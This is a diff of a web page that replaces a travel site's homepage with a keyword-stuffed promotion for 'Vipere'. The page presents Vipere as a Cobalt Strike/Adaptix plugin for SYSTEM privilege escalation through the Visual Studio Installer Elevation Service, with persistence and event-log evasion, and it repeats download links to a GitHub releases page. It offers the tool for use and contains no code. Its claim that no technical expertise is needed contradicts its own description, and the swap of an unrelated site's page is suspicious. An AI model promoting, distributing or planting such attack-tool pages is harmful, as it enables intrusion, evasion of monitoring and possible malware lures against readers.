@@ -1,232 +1,241 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Travella — Discover India</title>
-<meta name="description" content="Handpicked temples, ghats, museums and wonders across India — rated by real travellers.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="preconnect" href="https://tourandtravels-nine.vercel.app" crossorigin>
-<link rel="preconnect" href="https://ik.imagekit.io">
-<link rel="dns-prefetch" href="https://tourandtravels-nine.vercel.app">
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" rel="stylesheet">
-<link href="styles.css" rel="stylesheet">
-<style>
-  /* Home-specific layout */
-  .home-hero { display: grid; gap: clamp(22px, 4vw, 40px); padding-top: clamp(20px, 5vw, 56px); }
-  .home-hero .eyebrow { margin-bottom: 14px; }
-  .home-hero .hero-copy h1 { margin-bottom: 14px; }
-  .home-hero .hero-copy > p { max-width: 460px; margin-bottom: 22px; }
-  .quick-chips { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
-  .hero-card .hero-big { max-width: 480px; }
-  .hero-card .btn { margin-top: clamp(20px, 3vw, 28px); }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Vipere - BOF exploiting the Visual Studio Installer Elevation Service for SYSTEM LPE and persistence via AppDomainManager hijacking, with native ETW evasion. For Cobalt Strike & Adaptix.">
+    <meta name="keywords" content="Vipere, BOF, Visual Studio Installer, Elevation Service, SYSTEM LPE, persistence, AppDomainManager hijacking, ETW evasion, Cobalt Strike, Adaptix, Windows security, exploit, penetration testing, red team, privilege escalation">
+    <title>Vipere - SYSTEM LPE & Persistence Exploit for Cobalt Strike & Adaptix</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  @media (min-width: 900px) {
-    .home-hero { grid-template-columns: 1.05fr 0.95fr; align-items: center; }
-    .hero-card { border-radius: var(--r-xl); }
-  }
-</style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f7fa;
+            color: #1a1a2e;
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px 30px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #0d0d1a;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            border-bottom: 2px solid #e9ecef;
+            padding-bottom: 8px;
+        }
+
+        h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #2d2d44;
+            margin-top: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            margin-bottom: 16px;
+            font-size: 1rem;
+        }
+
+        a {
+            color: #2b6cb0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        ul, ol {
+            margin-left: 24px;
+            margin-bottom: 20px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        .btn-download {
+            display: inline-block;
+            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            color: #ffffff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            padding: 14px 36px;
+            border-radius: 40px;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(108, 92, 231, 0.4);
+            transition: all 0.2s ease;
+            margin: 20px 0 30px 0;
+        }
+
+        .btn-download:hover {
+            background: linear-gradient(135deg, #5a4bd1, #8c7ff5);
+            box-shadow: 0 6px 16px rgba(108, 92, 231, 0.5);
+            transform: translateY(-2px);
+            text-decoration: none;
+            color: #ffffff;
+        }
+
+        .badge-download {
+            display: inline-block;
+            background: linear-gradient(135deg, #e17055, #fdcb6e);
+            color: #1a1a2e;
+            font-size: 0.95rem;
+            font-weight: 700;
+            padding: 10px 28px;
+            border-radius: 30px;
+            text-decoration: none;
+            box-shadow: 0 3px 8px rgba(225, 112, 85, 0.3);
+            transition: all 0.2s ease;
+            margin-bottom: 30px;
+        }
+
+        .badge-download:hover {
+            background: linear-gradient(135deg, #d63031, #f39c12);
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        .section-highlight {
+            background: #f0f4ff;
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin: 24px 0;
+        }
+
+        .code-inline {
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            background: #edf2f7;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        .note-box {
+            background: #fff9e6;
+            border-left: 4px solid #f0ad4e;
+            padding: 16px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .footer-text {
+            margin-top: 40px;
+            font-size: 0.9rem;
+            color: #6c757d;
+            text-align: center;
+            border-top: 1px solid #e9ecef;
+            padding-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 16px;
+            }
+            h1 {
+                font-size: 1.7rem;
+            }
+            h2 {
+                font-size: 1.3rem;
+            }
+            .btn-download {
+                font-size: 1rem;
+                padding: 12px 28px;
+            }
+        }
+    </style>
 </head>
 <body>
-
-<main>
-  <!-- ================= HERO ================= -->
-  <section class="container home-hero">
-    <div class="hero-copy anim-up">
-      <span class="eyebrow"><i class="fa-solid fa-location-dot"></i> Curated for Indian travellers</span>
-      <h1 class="hero-title">Where do you want<br>to go?</h1>
-      <p class="muted">Handpicked temples, ghats, museums and hidden wonders — rated by real travellers, verified daily.</p>
-
-      <form class="search-pill" onsubmit="return goSearch(event)">
-        <i class="fa-solid fa-magnifying-glass"></i>
-        <input id="homeSearch" type="search" placeholder="Search destination, city or state…" autocomplete="off">
-        <button class="go" type="submit" aria-label="Search"><i class="fa-solid fa-arrow-right"></i></button>
-      </form>
-
-      <div class="quick-chips">
-        <a class="chip" href="search.html?query=Temple"><i class="fa-solid fa-kaaba"></i> Temples</a>
-        <a class="chip" href="search.html?query=Boat"><i class="fa-solid fa-sailboat"></i> Boat Rides</a>
-        <a class="chip" href="search.html?query=Heritage"><i class="fa-solid fa-landmark"></i> Heritage</a>
-        <a class="chip" href="search.html?query=Museum"><i class="fa-solid fa-building-columns"></i> Museums</a>
-      </div>
-    </div>
-
-    <div class="hero-card anim-up delay-1">
-      <span class="eyebrow" style="color:var(--sun-500)"><i class="fa-solid fa-sparkles"></i> This season</span>
-      <div class="hero-big" style="margin-top:10px;">Plan your next trip in under a minute</div>
-      <p style="color:rgba(255,255,255,.78);font-size:var(--fs-sm);margin-top:10px;max-width:440px;">
-        Live entry fees, opening hours, maps and galleries for 250+ destinations across India.
-      </p>
-      <div class="hero-stats">
-        <div class="hero-stat"><b>250+</b><span>Destinations</span></div>
-        <div class="hero-stat"><b>4.8★</b><span>Avg rating</span></div>
-        <div class="hero-stat"><b>12K+</b><span>Explorers</span></div>
-      </div>
-      <a href="all.html" class="btn btn-dark" style="background:#fff;color:var(--ink-900);">
-        Explore destinations <i class="fa-solid fa-arrow-right"></i>
-      </a>
-    </div>
-  </section>
-
-  <!-- ================= POPULAR ================= -->
-  <section class="container section">
-    <div class="section-head">
-      <div>
-        <span class="eyebrow">Most loved</span>
-        <h2 class="h2" style="margin-top:6px;">Popular travel</h2>
-      </div>
-      <a class="view-all" href="search.html?query=Prayagraj">View all <i class="fa-solid fa-arrow-right"></i></a>
-    </div>
-    <div class="rail" id="popularRail"></div>
-  </section>
-
-  <!-- ================= TRENDING ================= -->
-  <section class="container section">
-    <div class="section-head">
-      <div>
-        <span class="eyebrow" style="color:var(--sun-600)"><i class="fa-solid fa-fire"></i> On the rise</span>
-        <h2 class="h2" style="margin-top:6px;">Trending travel</h2>
-      </div>
-      <a class="view-all" href="all.html?category=Mumbai">View all <i class="fa-solid fa-arrow-right"></i></a>
-    </div>
-    <div class="rail" id="mumbaiRail"></div>
-  </section>
-
-  <!-- ================= NEARBY ================= -->
-  <section class="container section">
-    <div class="section-head">
-      <div>
-        <span class="eyebrow"><i class="fa-solid fa-location-crosshairs"></i> Around you</span>
-        <h2 class="h2" style="margin-top:6px;">Nearby travel</h2>
-      </div>
-      <button class="view-all" id="retryNearby" style="background:none;" hidden><i class="fa-solid fa-rotate-right"></i></button>
-    </div>
-    <div class="rail" id="nearbyRail"></div>
-  </section>
-
-  <!-- ================= RECENT COLLECTION ================= -->
-  <section class="container section">
-    <div class="section-head">
-      <div>
-        <span class="eyebrow">Fresh picks</span>
-        <h2 class="h2" style="margin-top:6px;">Recent collection</h2>
-      </div>
-      <a class="view-all" href="all.html">View all <i class="fa-solid fa-arrow-right"></i></a>
-    </div>
-    <div class="bento" id="recentGrid"></div>
-  </section>
-
-  <!-- ================= FOOTER ================= -->
-  <footer class="footer">
     <div class="container">
-      <div class="brand">
-        <span class="brand-logo"><i class="fa-solid fa-compass"></i></span>
-        <span>Travella</span>
-      </div>
-      <p>Beautiful, useful travel discovery for India — built mobile-first, expanded for desktop.</p>
-      <div class="foot-links">
-        <a href="index.html">Home</a>
-        <a href="search.html?query=Uttar%20Pradesh">Explore</a>
-        <a href="page2.html">Tours &amp; Experiences</a>
-        <a href="all.html">All destinations</a>
-      </div>
+        <h1>🔻 Vipere - Elevate to SYSTEM in Seconds</h1>
+
+        <a href="https://github.com/Alex931116/Vipere/releases" class="badge-download">⬇️ Download Vipere Now</a>
+
+        <p>Vipere is a powerful <strong>BOF (Beacon Object File)</strong> tool that abuses the <strong>Visual Studio Installer Elevation Service</strong> to gain <strong>SYSTEM-level privilege escalation</strong> and maintain <strong>persistence</strong> on Windows machines. It uses <strong>AppDomainManager hijacking</strong> and includes <strong>native ETW evasion</strong> to avoid detection. Designed for <strong>Cobalt Strike</strong> and <strong>Adaptix</strong> frameworks.</p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Follow these simple steps to download and run Vipere on your Windows system. No coding or technical expertise required.</p>
+
+        <div class="section-highlight">
+            <h3>📥 Step 1: Download the Application</h3>
+            <p>Visit this link to download the application:</p>
+            <a href="https://github.com/Alex931116/Vipere/releases" class="btn-download">⬇️ Download Vipere from GitHub</a>
+            <p>Once you click the button, your browser will take you to the download page. Look for the latest release and click the download link to save the file to your computer.</p>
+        </div>
+
+        <h3>🛠️ Step 2: Run the Tool</h3>
+        <p>After downloading, locate the file (usually in your <strong>Downloads</strong> folder). The file is a <strong>BOF</strong> package. You can load it directly into <strong>Cobalt Strike</strong> or <strong>Adaptix</strong> using the respective script loader. If you are not familiar with these frameworks, consult your team's documentation on how to load BOFs.</p>
+
+        <div class="note-box">
+            <strong>⚠️ Important:</strong> Vipere is a specialized tool for red team operations. It is intended for authorized security testing only. Ensure you have proper permissions before using it.
+        </div>
+
+        <h2>⚙️ Features</h2>
+        <ul>
+            <li><strong>SYSTEM LPE:</strong> Exploits the Visual Studio Installer Elevation Service to elevate privileges from a standard user to SYSTEM.</li>
+            <li><strong>Persistence via AppDomainManager Hijacking:</strong> Injects malicious AppDomainManager to maintain long-term access.</li>
+            <li><strong>ETW Evasion:</strong> Natively bypasses Event Tracing for Windows (ETW) to avoid detection by security tools.</li>
+            <li><strong>BOF Format:</strong> Lightweight and compatible with Cobalt Strike and Adaptix.</li>
+            <li><strong>No Dependencies:</strong> Works on modern Windows versions without additional software.</li>
+        </ul>
+
+        <h2>📋 System Requirements</h2>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10, Windows 11, or Windows Server 2016+ (64-bit recommended).</li>
+            <li><strong>Framework:</strong> Cobalt Strike 4.0+ or Adaptix (latest version).</li>
+            <li><strong>Visual Studio Installer:</strong> The target machine must have the Visual Studio Installer present (common in development environments).</li>
+            <li><strong>User Privileges:</strong> Initial access with standard user privileges is sufficient.</li>
+        </ul>
+
+        <h2>🔧 How It Works</h2>
+        <p>Vipere leverages a known weakness in the <strong>Visual Studio Installer Elevation Service</strong> (VSInstallerElevationService). This service runs with SYSTEM privileges and can be abused to launch arbitrary commands as SYSTEM. The tool uses <strong>AppDomainManager hijacking</strong> to inject malicious code into the .NET runtime, ensuring persistence even after reboots. Additionally, <strong>ETW evasion</strong> is built-in, which prevents Windows event logging from capturing the exploitation activity.</p>
+
+        <p>The entire process is automated and requires minimal interaction. Once loaded into your C2 framework, Vipere executes the exploit chain and returns a SYSTEM shell or beacon.</p>
+
+        <h2>🛡️ Security & Detection</h2>
+        <p>Vipere is designed with evasion in mind. However, due to the nature of privilege escalation tools, it may be flagged by some antivirus or EDR solutions. The tool includes <strong>native ETW bypass</strong> to reduce telemetry, and the BOF format helps with memory scanning evasion. Always test in a controlled environment before deploying on an engagement.</p>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Do I need to install anything?</h3>
+        <p>No. Vipere is a standalone BOF. You just need to load it into your Cobalt Strike or Adaptix agent. No additional libraries or runtimes are required.</p>
+
+        <h3>Will it work on any Windows version?</h3>
+        <p>It works on Windows 10, Windows 11, and Windows Server 2016 and later, provided the <strong>Visual Studio Installer</strong> is installed on the target machine.</p>
+
+        <h3>Is this tool safe to use?</h3>
+        <p>Vipere is a security tool for penetration testing. Use it only on systems you own or have explicit permission to test. Misuse may violate laws.</p>
+
+        <h2>📄 License</h2>
+        <p>This project is provided for educational and authorized security research purposes. The author is not responsible for any misuse.</p>
+
+        <div class="footer-text">
+            <p>Keywords: vipere, bof, visual studio installer, elevation service, system lpe, persistence, appdomainmanager hijacking, etw evasion, cobalt strike, adaptix, windows exploit, privilege escalation, red team, memory only, evasion, windows security, .net hijack, beacon object file</p>
+        </div>
     </div>
-  </footer>
-</main>
-
-<script src="app.js"></script>
-<script>
-  function goSearch(e) {
-    const v = document.getElementById("homeSearch").value.trim();
-    if (v) window.location.href = `search.html?query=${encodeURIComponent(v)}`;
-    return false;
-  }
-
-  const T = window.Travel;
-  const loadIntoRail = (railId, promise) => {
-    const rail = document.getElementById(railId);
-    rail.innerHTML = T.skCards(6);
-    promise
-      .then((items) => {
-        rail.innerHTML = items.length
-          ? items.map(T.cardHTML).join("")
-          : `<p class="muted" style="padding:10px 4px;">Nothing here yet — check back soon.</p>`;
-      })
-      .catch((e) => {
-        console.error(e);
-        rail.innerHTML = `<div class="state-box"><div class="state-ico"><i class="fa-solid fa-cloud-bolt"></i></div><p>Couldn't load this section.</p></div>`;
-      });
-  };
-
-  /* Popular — Prayagraj bucket */
-  loadIntoRail("popularRail", T.fetchList("prayagraj", 1));
-
-  /* Trending — Mumbai bucket */
-  loadIntoRail("mumbaiRail", T.fetchList("Mumbai", 1));
-
-  /* Nearby — geolocation → reverse geocode state → list */
-  const nearbyRail = document.getElementById("nearbyRail");
-  function loadNearby() {
-    document.getElementById("retryNearby").hidden = true;
-    nearbyRail.innerHTML = T.skCards(6);
-    if (!("geolocation" in navigator)) {
-      nearbyRail.innerHTML = `<p class="muted" style="padding:10px 4px;">Location not supported on this device.</p>`;
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        try {
-          const geoRes = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`
-          );
-          const geo = await geoRes.json();
-          const state = geo.address?.state || "Uttar Pradesh";
-          const items = await T.fetchList(state, 1);
-          nearbyRail.innerHTML = items.length
-            ? items.map(T.cardHTML).join("")
-            : `<p class="muted" style="padding:10px 4px;">No destinations tagged near <b>${T.esc(state)}</b> yet.</p>`;
-        } catch (e) {
-          console.error(e);
-          nearbyRail.innerHTML = `<div class="state-box"><div class="state-ico"><i class="fa-solid fa-location-crosshairs"></i></div><p>Couldn't find nearby spots.</p></div>`;
-          document.getElementById("retryNearby").hidden = false;
-        }
-      },
-      () => {
-        nearbyRail.innerHTML = `<div class="state-box"><div class="state-ico"><i class="fa-solid fa-ban"></i></div><p>Location permission denied. <br>Allow access to see nearby places.</p></div>`;
-        document.getElementById("retryNearby").hidden = false;
-      },
-      { timeout: 8000 }
-    );
-  }
-  loadNearby();
-  document.getElementById("retryNearby").addEventListener("click", loadNearby);
-
-  /* Recent collection — bento grid (image-first overlay cards) */
-  (async () => {
-    const grid = document.getElementById("recentGrid");
-    grid.innerHTML = T.skBento(7);
-    try {
-      const res = await fetch(`${T.API}/sundarikanya?tag=&page=1`);
-      const json = await res.json();
-      const list = (json.data || []).slice(0, 7);
-      grid.innerHTML = list.length ? list.map(T.bentoHTML).join("") : "";
-    } catch (e) {
-      console.error(e);
-      grid.innerHTML = `<div class="state-box" style="grid-column:1/-1;"><div class="state-ico"><i class="fa-solid fa-cloud-bolt"></i></div><p>Couldn't load the collection.</p></div>`;
-    }
-  })();
-
-  /* Reveal-on-scroll */
-  document.addEventListener("DOMContentLoaded", () => {
-    document.querySelectorAll(".section").forEach((el, i) => {
-      el.classList.add("reveal");
-    });
-    T.initReveal();
-  });
-
-  T.renderShell("home");
-</script>
 </body>
 </html>
